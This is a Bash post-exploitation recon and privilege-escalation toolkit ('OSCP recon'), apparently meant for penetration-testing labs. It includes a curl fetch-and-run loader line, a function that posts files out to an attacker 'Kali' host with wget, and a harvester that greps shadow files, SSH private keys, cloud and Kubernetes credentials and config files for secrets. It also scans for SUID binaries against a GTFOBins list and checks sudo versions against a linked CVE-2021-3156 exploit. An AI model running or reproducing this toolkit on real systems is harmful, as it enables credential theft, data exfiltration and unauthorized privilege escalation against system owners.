#!/bin/bash
#
# . <(curl 10.10.10.10/recon.sh)
#

# Definición de colores
RESET="\e[0m"       # Resetear color
BOLD="\e[1m"        # Texto en negrita
RED="\e[1;31m"      # Rojo
GREEN="\e[1;32m"    # Verde
YELLOW="\e[1;33m"   # Amarillo
BLUE="\e[1;34m"     # Azul
CYAN="\e[1;36m"     # Cian


IP_KALI="{IP_KALI}"

#------------------------------------------------------
#  * Available functions *
#-------------------------------------------------------
function recon.help(){
    banner
    echo """
 [*] Auxiliary tools:
    - aux.upload [file]               : Send files to http server via post
    - aux.download [file]             : Perform GET to fetch files

 [*] Environment fix:
    - env.fix                       : fixes env PATH

 [*] Auxiliary recon:
    - recon.dateScan                  : Files modified between two dates
    - recon.dateLast                  : Files modified less than 15min ago
    - recon.dateSuspicious            : Suspicious timestamp binaries (IPPSEC)
    - recon.portscan <host> [1-1024]  : Perform port scanning
    - recon.pingscan 10.10.10.        : Perform /24 subnet ping scan
    - recon.pspy                      : Simple process monitor
    - recon.logs                      : Searchs for credentiales in logs

 [*] General recon:
    - recon.basic                     : Basic information
    - recon.sys                       : System information
    - recon.users                     : Local user information
    - recon.programs                  : Recent installed packages information
    - recon.process                   : Current processes information
    - recon.procmon                   : List new processes
    - recon.networks                  : Network information
    - recon.python                    : python path hijacking
    - recon.files                     : sensitive files
    - recon.mysql                     : mysql as privileged user
    - recon.exports                   : NFS privesc
    - recon.ports                     : internal ports

 [*] Privesc recon:
    - priv.setuid                     : Search for SETUID binaries
    - priv.suid                       : same as setuid but simply
    - priv.guid                       : GUID binaries
    - priv.sudo                       : sudo version
    - priv.sudoers                    : sudoers version
    - priv.capabilities               : Search for present capabilities
    - priv.writable                   : Search for manipulable locations
    - priv.search.fname               : Search files with name passwd 
    - priv.search.fcontent            : Search files with passwd content
    - priv.search.sshkeys             : Search potential ssh files
    - priv.crontabs                   : Search for crontabs
    - priv.mysql                      : MySQL Ver 14.14 running as root
    """
}

function priv.mysql {
  ps -aux | grep -i "sql"
}

#------------------------------------------
#  *   Upload files via http POST  *
#------------------------------------------
function aux.upload {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Upload file:"
		echo "        aux.upload <File>"
		return
	fi
    filename=$(basename "$1")
    wget --post-file=$1 -O /dev/null --header="Content-Disposition: attachment; filename="$filename $IP_KALI 
}

function env.fix {

  env reset
  stty onlcr
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/root/.local/bin:/usr/share:/snap/bin:/usr/sandbox:/usr/local/go/bin:/usr/share/games:/opt:/root/go/bin:/opt/bin:/opt/local/bin:/opt/tools:$HOME/bin:$HOME/.local/bin:$HOME/scripts:/var/www/html/scripts:/usr/libexec:/etc/custom/scripts:/mnt/shared/scripts
  export TERM=xterm-256color
  reset xterm


}



function recon.logs() {
    # Definir rutas comunes de logs


local log_paths=(
    "/var/log/auth.log"                    # Logs de autenticación
    "/var/log/secure"                      # Logs de autenticación (CentOS/Red Hat)
    "/var/log/syslog"                      # Logs del sistema
    "/var/log/messages"                    # Logs generales del sistema
    "/var/log/nginx/access.log"            # Logs de acceso Nginx
    "/var/log/nginx/error.log"             # Logs de error Nginx
    "/var/log/httpd/access_log"            # Logs de acceso Apache
    "/var/log/httpd/error_log"             # Logs de error Apache
    "/var/log/mysql/error.log"             # Logs de MySQL
    "/var/log/postgresql/postgresql.log"   # Logs de PostgreSQL
    "/var/log/maillog"                     # Logs de correos
    "/var/log/dpkg.log"                    # Logs de paquetes Debian
    "/var/log/yum.log"                     # Logs de paquetes YUM
    "/home/*/.bash_history"                # Historial de comandos bash
    "/root/.bash_history"                  # Historial de root
    "/var/log/cloud-init.log"              # Logs de inicialización en la nube
    "/var/log/cloud-init-output.log"       # Salida de inicialización en la nube
    "/etc/passwd"                          # Archivo de usuarios (sin contraseñas)
    "/etc/shadow"                          # Archivo de contraseñas encriptadas
    "/var/log/btmp"                        # Registros de intentos de acceso fallidos
    "/var/log/wtmp"                        # Historial de inicios de sesión
    "/var/log/lastlog"                     # Últimos accesos de usuarios
    "/var/log/faillog"                     # Información de fallos de autenticación
    "/var/log/samba/log.smbd"              # Logs de Samba, puede contener contraseñas
    "/var/log/krb5kdc.log"                 # Logs de Kerberos
    "/var/log/sudo.log"                    # Logs de sudo
    "/var/log/openvpn.log"                 # Logs de OpenVPN
    "/var/log/audit/audit.log"             # Logs de auditd
    "/etc/ssh/sshd_config"                 # Configuración de SSH
    "/etc/ssh/ssh_config"                  # Configuración del cliente SSH
    "/etc/ldap.conf"                       # Configuración de LDAP
    "/etc/nginx/nginx.conf"                # Configuración de Nginx
    "/etc/httpd/conf/httpd.conf"           # Configuración de Apache
    "/etc/proftpd/proftpd.conf"            # Configuración de ProFTPD
    "/etc/vsftpd.conf"                     # Configuración de VSFTPD
    "/etc/mysql/my.cnf"                    # Configuración de MySQL
    "/etc/postgresql/*/main/pg_hba.conf"   # Configuración de autenticación PostgreSQL
    "/etc/docker/daemon.json"              # Configuración de Docker
    "/root/.mysql_history"                 # Historial de comandos MySQL root
    "/home/*/.mysql_history"               # Historial de comandos MySQL del usuario
    "/root/.ssh/id_rsa"                    # Clave privada RSA del usuario root
    "/home/*/.ssh/id_rsa"                  # Clave privada RSA del usuario
    "/etc/ssh/ssh_host_rsa_key"            # Clave privada RSA del host SSH
    "/root/.ssh/known_hosts"               # Lista de hosts conocidos
    "/tmp/"                                # Directorio temporal, posibles datos sensibles
    "/var/tmp/"                            # Similar a /tmp
    "/var/www/html/config.php"             # Configuración PHP
    "/var/www/html/.env"                   # Archivos de entorno
    "/var/www/html/wp-config.php"          # Configuración de WordPress
    "/root/.aws/credentials"               # Claves de acceso AWS
    "/root/.azure/credentials"             # Credenciales de Azure
    "/root/.config/gcloud/application_default_credentials.json" # Claves de Google Cloud
    "/root/.kube/config"                   # Configuración de Kubernetes
    "/root/.terraform.d/credentials.tfrc.json" # Credenciales de Terraform
    "/root/.ansible_vault"                 # Claves de Ansible
    "/root/.pip/pip.conf"                  # Configuración de Python Pip
    "/root/.npmrc"                         # Configuración de NPM
    "/root/.gem/credentials"               # Credenciales para Rubygems
    "/etc/passwd-"                         # Backup del archivo de usuarios
    "/etc/shadow-"                         # Backup del archivo de contraseñas
    "/etc/ssl/private/"                    # Certificados privados SSL/TLS
    "/var/lib/docker/volumes/"             # Volúmenes de Docker
    "/var/lib/kubelet/config.yaml"         # Configuración de Kubelet
    "/etc/cron.d/"                         # Tareas programadas
    "/root/.docker/config.json"            # Configuración de Docker (claves privadas)
    "/var/log/snapd.log"                   # Logs de Snapd
    "/var/lib/snapd/state.json"            # Estado de Snapd
    "/root/.pypirc"                        # Configuración de PyPI
    "/var/spool/cron/root"                 # Cronjobs de root
    "/home/*/.git-credentials"             # Credenciales de Git
    "/var/log/journal/"                    # Logs persistentes de systemd
    "/root/.cache/gcloud/logs/"            # Logs de Google Cloud
)



    # Comando grep para buscar palabras clave relacionadas con credenciales
    local search_pattern='(password|username|user|pass|key|token|secret|admin|administrator|cred|login|credentials)'


    echo -e "${BLUE}[INFO]${RESET} Buscando posibles credenciales en logs..."
    for log in "${log_paths[@]}"; do
        if [[ -f "$log" ]]; then
            printf "${GREEN}[✔]${RESET} Procesando archivo: ${CYAN}%s${RESET}\n" "$log"
            results=$(grep -rinE --color=always "$search_pattern" "$log")
            if [[ -n "$results" ]]; then
                printf "${YELLOW}[!]${RESET} Resultados encontrados en: ${CYAN}%s${RESET}\n" "$log"
                echo -e "$results" | sed -E "s/($search_pattern)/$(printf "${RED}")\1$(printf "${RESET}")/g" | \
                    awk '{print "  ➤ " $0}'
            else
                printf "${GREEN}[✔]${RESET} Sin coincidencias en: ${CYAN}%s${RESET}\n" "$log"
            fi
        else
            printf "${RED}[✘]${RESET} Archivo no encontrado: ${CYAN}%s${RESET}\n" "$log"
        fi
    done

}


#------------------------------------------
#  * Download files via http POST *
#------------------------------------------
function aux.download {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Download file:"
		echo "        aux.download <File>"
		return
	fi
	wget "$IP_KALI/$1"
}


#------------------------------------------
#  * Search files modified 15 minutes ago *
#------------------------------------------
function recon.dateLast(){
	find / -type f -mmin -15 -exec ls -la {} \; 2>/dev/null | grep -v proc
}

function recon.ports(){
	netstat -nat
}


function recon.basic(){
  echo "PATH"
  echo $PATH
  echo "\n"
  echo "groups"
	id
  echo "\n"
  echo "bash version"
  /bin/bash --version
  echo "Bash versions <4.2-048 vulnerable"
  echo "\n"
  echo "kernel version"
  uname -r
  echo "linux kernel under 5.8 -> dirty pipe"
  echo "2.6.22 < 3.9 -> dirty cow"
  
}

function priv.sudoers()
{
  sudo -l
}

function recon.files(){
  ls -l  /etc/shadow
  echo "writable or readable shadow = vulnerable"
  ls -l /etc/passwd
  echo "writable passwd = vulnerable"
  ls -l /etc/sudoers
  echo "writable sudoers = vulnerable"
}

function recon.exports(){
  cat /etc/exports
  echo "NFS priv esc"
}

function recon.mysql ()
{
  ps -aux | grep mysql
  echo "mysql running as privileged user like root"
}

function recon.python() {
    # Busca ejecutables de Python en el PATH
    found=false
    for python in $(compgen -c | grep -E '^python[0-9\.]*$' | sort -u); do
        # Comprueba si el comando se puede ejecutar
        if command -v "$python" > /dev/null 2>&1; then
            echo -ne "\nFound Python: $python"
            "$python" -c 'import sys; print(sys.path)'
            found=true
        fi
    done

    if [ "$found" = false ]; then
        echo "No Python version found."
        return 1
    fi

    return 0
}




#------------------------------------------
#  * Search files between two dates *
#------------------------------------------
function recon.dateScan(){
	if [[ $# -ne 2  ]]; then
		echo ""
		echo " [>] Report between two dates:"
		echo "        dan.dateScan 2020-01-01 2020-02-01"
		return
	fi

	dat1=$1
	dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")

	while [[ "$dat1" < "$2" ]];do
		echo ""
		echo "------------------------------------------------"
		echo -e "\e[102m            $dat1 <-> $dat2           \e[0m"
		echo "------------------------------------------------"

		find / -type f -newermt $dat1 ! -newermt $dat2 -exec ls -la {} \; 2>/dev/null

		#Add one more day
		dat1=$dat2
		dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")
	done
}


#------------------------------------------
#  * Executables with suspicious date *
#------------------------------------------
function recon.dateSuspicious(){
	for i in $(echo $PATH | tr ":" "\\n"); do ls -la --time-style=full $i | grep -v "000000\\|->";done
}


#------------------------------------------
#  * Port Scanner *
#------------------------------------------
function recon.portscan() {
    local ip=$1
    local port_range=${2:-"1-1024"}

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Port Scanner:"
        echo "        recon.portscan <host> [1-1024]"
        return
    fi

    IFS='-' read -r start_port end_port <<< "$port_range"

    for port in $(seq "$start_port" "$end_port"); do
        (echo >/dev/tcp/$ip/$port) &>/dev/null && echo "     [>] Port $port is open!"
    done
}


#------------------------------------------
#  * Ping Scan /24 subnet *
#------------------------------------------
function recon.pingscan() {
    local ip=$1

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Net Ping Scan:"
        echo "        recon_pingscan 192.168.0."
        return
    fi

    for i in {1..225}; do
        current_ip="$ip$i"
        if ping -c 1 -W 1 "$current_ip" &>/dev/null; then
            echo "$current_ip: Responding"
        fi
    done
}


#------------------------------------------
#  System Information
#------------------------------------------
function recon.sys {
	echo ""
    echo " [*] System Information:"
	echo " -------------------------------------"
	echo " Hostname: $(hostname)"
	echo " Kernel: $(uname -a)"
	echo " Uptime: $(uptime -p)"
	echo ""
	echo " [*] CPU Information:"
	echo " -------------------------------------"
	echo " CPU Model: $(grep "model name" /proc/cpuinfo | head -n1 | cut -d':' -f2 | tr -s ' ')"
	echo " CPU Cores: $(grep "^processor" /proc/cpuinfo | wc -l)"
	echo ""
	echo " [*] Memory Information:"
	echo " -------------------------------------"
	echo " Total Memory: $(free -h | awk '/^Mem:/ {print $2}')"
	echo " Used Memory:  $(free -h | awk '/^Mem:/ {print $3}')"
	echo ""
	echo " [*] Disk Information:"
	echo " -------------------------------------"
	df -h | awk '$NF=="/" {print " Root Disk: Total=" $2 ", Used=" $3 ", Free=" $4}'
	echo ""
	echo " GPU Information:"
	echo " -------------------------------------"
	echo " $(lspci | grep -i "vga\|3d")"
	echo ""
}


#------------------------------------------
#  Information about system users and groups
#------------------------------------------
function recon.users {
	echo ""
    echo " ##############################################################"
    echo "                   Active System Users"
    echo " ##############################################################"

    grep "sh" /etc/passwd 
	while IFS=: read -r username _ uid _ _ hom term; do
    if [ "$uid" -ge 1000 ] && [ "$uid" -ne 65534 ]; then
        echo "   [>] $username \tHome: $hom \tTerm: $term"
        echo "         Groups:"
        echo -n "       " ;groups $username | cut -d ' ' -f3- | xargs -n1 echo -n " "
        echo ""
    fi
	done < /etc/passwd
}


#------------------------------------------
#  Recently Installed Packages
#------------------------------------------
function recon.programs {
	echo ""
    echo " ##############################################################"
    echo "        Last 100 Installed Packages on the System"
    echo " ##############################################################"
	echo ""
    grep " install " /var/log/dpkg.log* | sed 's/^[^:]*://g' | sort | tail -n100
    echo ""
}


#------------------------------------------
#  System Process Information
#------------------------------------------
function recon.process {
	echo ""
	ps auxf | grep -vE "\[.*\]" | cut -c 1-$(tput cols)
	echo ""
}

function recon.procmon {
	echo ""
	
  old_process=$(ps -eo command)

  while true; do
      new_process=$(ps -eo command)
      diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command|kworker"
      old_process=$new_process
  done

	echo ""
}


#------------------------------------------
#  Network Information
#------------------------------------------
function recon.networks {
	echo ""
    echo "##############################################################"
    echo "                Open Ports on the Machine"
    echo "##############################################################"
	ss -tupln
	echo ""
    echo "##############################################################"
    echo "                     Network Interfaces"
    echo "##############################################################"
    ip addr
	echo ""
    echo "##############################################################"
    echo "                       Routing Table"
    echo "##############################################################"
    route
}


#------------------------------------------
#  pspy-like Auxiliary Program
#------------------------------------------
function recon.pspy() {
	echo ""
    echo "##############################################################"
    echo "         Monitoring New Processes on the Machine"
    echo "##############################################################"
    while true; do
        processes=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        sleep 0.2
        processes2=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        diff <(echo "$processes") <(echo "$processes2") | grep "^>"
    done
}



function priv.sudo {

  echo ""
    echo "##############################################################"
    echo "                      SETUID Programs"
    echo "##############################################################"
  sudo --version
  echo "versiones 1.8.2, 1.8.31p2 y todas las versiones estables de la 1.9.0 a la 1.9.5p1"
  echo "https://github.com/teamtopkarl/CVE-2021-3156/tree/main"


}

#------------------------------------------
#  SETUID Programs
#------------------------------------------
function priv.setuid {
	#Programs from GFOBins
	keywords=("aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk"
          "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat"
          "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh"
          "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig"
          "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand"
          "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage"
          "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install"
          "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so"
          "less" "logsave" "look" "lua" "make" "mawk" "minicom" "more" "mosquitto" "msgattrib" "msgcat"
          "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice"
          "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec"
          "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent"
          "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim"
          "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass"
          "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset"
          "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq"
          "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view"
          "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap"
          "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")
	echo ""
    echo "##############################################################"
    echo "                      SETUID Programs"
    echo "##############################################################"
    setuids=$(find / -perm -4000 -type f ! -path "/dev/*" -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}')
	echo "$setuids" | while IFS= read -r line; do
	binary_name=$(echo "$line" | awk '{print $NF}' | xargs basename)
	out="$line"
	for keyword in "${keywords[@]}"; do
	  if [[ "$binary_name" == "$keyword" ]]; then
	    out="\033[1;31m$line\033[0m"
	    break
	  fi
	done
	echo -e "$out"
	done
	}

function priv.suid {
  find / -perm -4000 -exec ls -l {} \; 2> /dev/null
}

function priv.guid {
  find / -perm -2000 -exec ls -l {} \; 2> /dev/null
}

#------------------------------------------
#      Programs with Capabilities
#------------------------------------------
function priv.capabilities {
	echo ""
    echo "##############################################################"
    echo "                Programs with Capabilities"
    echo "##############################################################"
	/usr/sbin/getcap -r / 2>/dev/null
}


#------------------------------------------
#  User-Writable Directories
#------------------------------------------
function priv.writable {
	echo ""
    echo "##############################################################"
    echo "                 User-Writable Locations"
    echo "##############################################################"
	find / -writable ! -path "/proc/*" ! -path "/dev/*" ! -path "/run/*" ! -path "/sys/*" -exec ls -adl {} \; 2>/dev/null
}


#------------------------------------------
#  Files by Password-Like Name
#------------------------------------------
function priv.search.fname {
	echo ""
    echo "##############################################################"
    echo "               Files with 'passw' on name"
    echo "##############################################################"
    find . -type f \( -name "*.config" -o -name "*.conf" -o -name "*passw*" \)  -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}'
}


#------------------------------------------
#  Files that May Contain Passwords
#------------------------------------------
function priv.search.fcontent {
	echo ""
    echo "##############################################################"
    echo "             Files Containing 'passw' word"
    echo "##############################################################"
    find . -type f \( -name "*.dll" -o -name "*.so" -o -name "*.js" \) -prune -o -exec grep -i -l "passw" {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  Potential SSH Key Files
#------------------------------------------
function priv.search.sshkeys {
    echo ""
    echo "##############################################################"
    echo "                       SSH Key Files"
    echo "##############################################################"
    find . -type f -exec grep -l '^-----BEGIN \(RSA\|DSA\|EC\|OPENSSH\) PRIVATE KEY-----' {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  System Crontabs
#------------------------------------------
function priv.crontabs {
	echo ""
    echo "##############################################################"
    echo "              Scheduled Tasks on the System"
    echo "##############################################################"
    find /etc/cron* -type f -not -name "*.placeholder" -exec bash -c "echo;echo;echo ---------------------------------;echo {};echo ---------------------------------;cat {}" \;
	echo ""
    echo "##############################################################"
    echo "                Scheduled Tasks in General"
    echo "##############################################################"
    cat /etc/crontab
	echo ""
    echo "##############################################################"
    echo "          Search in syslog for Scheduled Tasks"
    echo "##############################################################"
    grep "CRON" /var/log/syslog 2>/dev/null | tail -n 50
}


#------------------------------------------
#  Additional Function to Display Banner
#------------------------------------------
function banner {
	echo "

     ___  __    ___   ___                            
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __  
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \  
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|
                                                     
 ========================================================
                                             DannyDB@~>
 "
}


#------------------------------------------
#  Additional Function to Execute Tree
#------------------------------------------
function tree {
    local directory=./
    echo ""
    echo "Directories: $directory"
    echo "----------------------------------"
    find "$directory" -type f | sed -e "s;^$directory;/;" | awk -F'/' '{for (i=2;i<NF;i++) printf "  "; print "|--", $NF}'
    echo ""
}

check_ip_kali() {
    if [[ "$IP_KALI" =~ "IP_KALI" ]]; then
        clear
        echo ""
        echo -n " [>] Please enter the IP address for Kali: "
        read IP_KALI
        export IP_KALI
        echo ""
    fi
}


#------------------------------------------
#  Some Aliases
#------------------------------------------
alias ll='ls -lh --group-dirs=first --color=auto'



check_ip_kali
recon.help

